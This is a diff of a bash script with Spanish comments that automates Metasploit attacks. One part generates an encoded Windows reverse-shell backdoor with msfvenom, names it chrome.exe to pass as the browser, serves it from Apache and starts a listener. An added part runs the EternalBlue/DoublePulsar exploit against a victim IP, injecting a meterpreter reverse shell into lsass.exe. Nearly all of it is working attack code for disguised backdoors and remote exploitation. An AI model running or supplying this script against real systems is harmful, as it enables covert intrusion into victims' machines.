@@ -41,30 +41,30 @@
 ######################################################################
 #	Ataque activo:
 #		Como crear un backdoor:
-#	Un Backdoor es un programa que abre un puerto en una maquina sin
-#	concentimiento del usuario para acceder a su sistema.
 #	Mediante el programa msfvenom se puede generar un backdoor llamado
-#	chrome.exe al igual que el navegador web google chrome.
-#	La idea es que este programa pase desapercivido por el usuario y su
-#	ejecucion sea igual a uno de los procesos naturales del SO. 
+#	como se desee, la mejor opcion es que su nombre sea igual a
+# 	cualquier programa de ejecucion natural del SO como por ejemplo
+#	chrome.exe que es igual al proceso que ejecuta el navegador web 
+#	google chrome. 
 #
-	LHOST=$(hostname -I)
-	LPORT=444
-	echo "IP LOCAL: "$LHOST" PUERTO: "$LPORT
+	LHOST=$(hostname -I)	#Captura la direccion IP de mi maquina, la maquina la cual va a conectarse la victima
+	LPORT=444				#Indica el puerto que va a enviar la informacion
+	echo "IP LOCAL: "$LHOST" PUERTO: "$LPORT	#Muestra en pantalla la direccion IP y el puerto
 	msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe -o /var/www/html/chrome.exe
+#	Genera chrome.exe y lo aloja en la carpeta html del servidor apache2	
 #
-	service apache2 start
+	service apache2 start	#Inicia el servidor apache2
 #	
 #	Crea el script que se ejecutara en metasplot	
 #
-	touch sploit.flo
-	echo "use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST "$LHOST"
-set LPORT "$LPORT"
-exploit" > sploit.flo
+	touch sploit.flo 	#Genera el fichero que tendra el sploit a ejecutar por metasploit
+	echo "use exploit/multi/handler" 					>> sploit.flo
+	echo "set payload windows/meterpreter/reverse_tcp" 	>> sploit.flo
+	echo "set LHOST "$LHOST 							>> sploit.flo
+	echo "set LPORT "$LPORT								>> sploit.flo
+	echo "exploit" 										>> sploit.flo
 
-	more sploit.flo
+	more sploit.flo 	#Muestra en pantalla el escript que se va a ejecutar
 #
 #	Ejecutamos la consola de Metasploit en conjunto con el fichero que
 # 	tiene las instrucciones para metasploit
@@ -75,3 +75,23 @@ exploit" > sploit.flo
 	rm /tmp/chrome.exe
 	rm /var/www/html/chrome.exe
 	rm sploit.flo
+######################################################################
+
+######################################################################
+#	Ataque pasivo:
+#
+#
+	RHOST=192.168.1.1	#Direccion IP de la victima
+	touch sploit.flo 	#Genera el fichero que tendra el sploit a ejecutar por metasploit
+	echo "use exploit/windows/smb/eternalblue_doublepulsar"	>> sploit.flo
+	echo "set RHOST "$RHOST 								>> sploit.flo
+	echo "set TARGETARCHITECHTURE x86" 						>> sploit.flo
+	echo "set PROCESSINJECT lsass.exe" 						>> sploit.flo
+	echo "set set TARJET 7"									>> sploit.flo
+	echo "set payload windows/x86/meterpreter/reverse_tcp"	>> sploit.flo
+	echo "exploit" 											>> sploit.flo 
+#
+	msfconsole -r sploit.flo
+	rm sploit.flo
+#
+######################################################################
